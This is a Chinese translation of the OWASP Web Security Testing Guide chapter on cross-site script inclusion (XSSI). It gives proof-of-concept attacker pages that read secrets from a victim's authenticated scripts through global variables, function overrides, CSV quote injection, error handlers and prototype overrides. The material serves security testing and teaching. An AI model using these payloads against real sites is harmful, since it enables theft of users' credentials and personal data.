# 测试跨站脚本包含

## 概述

跨站脚本包含（XSSI）漏洞可导致敏感数据跨源或跨域泄漏。敏感数据可能包括认证相关数据（登录状态、Cookie、认证令牌、会话ID等）或用户的个人/敏感个人数据（邮箱地址、电话号码、信用卡信息、社保号码等）。XSSI是一种客户端攻击，与跨站请求伪造（CSRF）类似但目的不同：CSRF利用已认证的用户上下文在受害者页面执行状态变更操作（如向攻击者账户转账、修改权限、重置密码等），而XSSI通过客户端JavaScript泄漏已认证会话中的敏感数据。

默认情况下，网站仅允许访问同源数据。这是应用安全的核心原则，受同源策略（由[RFC 6454](https://tools.ietf.org/html/rfc6454)定义）约束。源被定义为URI方案（HTTP或HTTPS）、主机名和端口号的组合。但该策略不适用于HTML `<script>`标签包含行为，此例外是必要的——若不存在该例外，网站将无法使用第三方服务、进行流量分析或使用广告平台等。

当浏览器打开包含 `<script>` 标签的网站时，会从跨源域获取资源。这些资源随后在包含站点或浏览器的同一上下文中运行，从而存在敏感数据泄漏的风险。在大多数情况下，该漏洞通过 JavaScript 实现，但脚本源不一定必须是类型为 `text/javascript` 或扩展名为 `.js` 的 JavaScript 文件。

旧版浏览器（如 IE9/10）的漏洞允许在运行时通过 JavaScript 错误消息泄漏数据，但这些漏洞已被厂商修复，目前相关性较低。通过设置 `<script>` 标签的 charset 属性，攻击者或测试人员可以强制使用 UTF-16 编码，在某些情况下允许泄漏其他数据格式（如 JSON）的信息。关于此类攻击的更多细节，可参考 [基于标识符的 XSSI 攻击](https://www.mbsd.jp/Whitepaper/xssi.pdf)。

## 测试目标

- 定位系统中的敏感数据。
- 评估通过不同技术手段导致的敏感数据泄漏风险。

## 如何测试

### 通过认证与非认证用户会话收集数据

识别负责发送敏感数据的端点、所需参数，并使用认证用户会话识别所有相关的动态和静态生成的JavaScript响应。需特别关注使用[JSONP](https://en.wikipedia.org/wiki/JSONP)发送的敏感数据。为发现动态生成的JavaScript响应，可分别生成认证和非认证请求并进行对比：若响应不同则为动态响应，反之为静态响应。为简化此过程，可使用工具如[Veit Hailperin的Burp代理插件](https://github.com/luh2/DetectDynamicJS)。除JavaScript外还需检查其他文件类型，XSSI不仅限于JavaScript文件。

### 判断敏感数据是否可通过JavaScript泄漏

测试人员应通过以下XSSI漏洞的数据泄漏载体进行代码分析：

1. 全局变量
2. 全局函数参数
3. 带引号窃取的CSV（逗号分隔值）
4. JavaScript运行时错误
5. 使用`this`的原型链

### 1. 通过全局变量导致的敏感数据泄露

在受害者网站 `victim.com` 上，一个API密钥存储在JavaScript文件 `https://victim.com/internal/api.js` 中，该文件仅对已认证用户可访问。攻击者配置了一个网站 `attackingwebsite.com`，并通过 `<script>` 标签引用了该JavaScript文件。

以下是 `https://victim.com/internal/api.js` 的内容：

```javascript
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

攻击站点 `attackingwebsite.com` 的 `index.html` 包含以下代码：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```

在此示例中，受害者已通过 `victim.com` 的认证。攻击者通过社会工程学、钓鱼邮件等方式诱使受害者访问 `attackingwebsite.com`。受害者的浏览器随后获取 `api.js`，导致敏感数据通过全局JavaScript变量泄露，并使用 `innerHTML` 显示。

### 2. 通过全局函数参数导致的敏感数据泄露

此示例与前一案例类似，不同之处在于本案例中 `attackingwebsite.com` 通过覆盖受害者的全局 JavaScript 函数，利用全局 JavaScript 函数提取敏感数据。

以下是 `https://victim.com/internal/api.js` 的内容：

```javascript
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

攻击站点 `attackingwebsite.com` 的 `index.html` 包含以下代码：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

此外，还存在其他可导致敏感数据泄露的 XSSI 漏洞，例如通过 JavaScript 原型链或全局函数调用实现的攻击。有关这些攻击的更多信息，请参阅[动态 JavaScript 的意外危险](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)。

### 3. 通过CSV引号窃取导致的敏感数据泄露

为实现数据泄露，攻击者需能够将JavaScript代码注入CSV数据。以下示例代码节选自Takeshi Terada的白皮书[基于标识符的XSSI攻击](https://www.mbsd.jp/Whitepaper/xssi.pdf)。

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

在此示例中，使用`___`列作为注入点并在其位置插入JavaScript字符串会产生以下结果。

<!--  -->
自定函数内拥有跨行注释
<!--  -->
```text
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

[Jeremiah Grossman在2006年撰文描述了Gmail中的类似漏洞](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html)，该漏洞允许以JSON格式提取用户联系人。在此案例中，数据从Gmail接收，并由浏览器JavaScript引擎使用未引用的Array构造函数解析导致数据泄露。攻击者可通过如下方式定义和覆盖内部Array构造函数来访问包含敏感数据的该Array：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // steal data
      }
    </script>
    <script src="https://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

### 4. 通过 JavaScript 运行时错误导致的敏感数据泄露

浏览器通常提供标准化的 [JavaScript 错误消息](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors)。但在 IE9/10 浏览器中，运行时错误消息会提供可能用于泄露数据的额外详细信息。例如，网站 `victim.com` 在 URI `https://victim.com/service/csvendpoint` 为已认证用户提供以下内容：

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: 13

1,abc,def,ghi
```

该漏洞可通过以下方式利用：

```html
<!--error handler -->
<script>window.onerror = function(err) {alert(err)}</script>
<!--load target CSV -->
<script src="https://victim.com/service/csvendpoint"></script>
```

当浏览器尝试将 CSV 内容渲染为 JavaScript 时，操作失败并泄露敏感数据：

![JavaScript 运行时错误消息](images/XSSI1.jpeg)\
*图 WSTG 4.11.13-1：JavaScript 运行时错误消息*

### 5. 通过使用 `this` 的原型链导致的敏感数据泄露

在 JavaScript 中，`this` 关键字具有动态作用域。这意味着如果一个函数在某个对象上被调用，`this` 将指向该对象，即使被调用的函数可能不属于该对象本身。此行为可用于泄露数据。在 [Sebastian Leike 演示页面](http://sebastian-lekies.de/leak/) 的以下示例中，敏感数据存储在数组中。攻击者可以使用攻击者控制的函数重写 `Array.prototype.forEach`。如果某些代码在包含敏感值的数组实例上调用 `forEach` 函数，则攻击者控制的函数将被调用，且 `this` 指向包含敏感数据的对象。

以下是包含敏感数据的 JavaScript 文件 `javascript.js` 的摘录：

```javascript
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // do something here
  });  
})();
...
```

敏感数据可通过以下 JavaScript 代码泄露：

```html
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Your secret values are: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="https://victim.com/..../javascript.js"></script>
...
```

## 引用

- [WSTG-CLNT-13](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md#3-sensitive-data-leakage-via-csv-with-quotations-theft)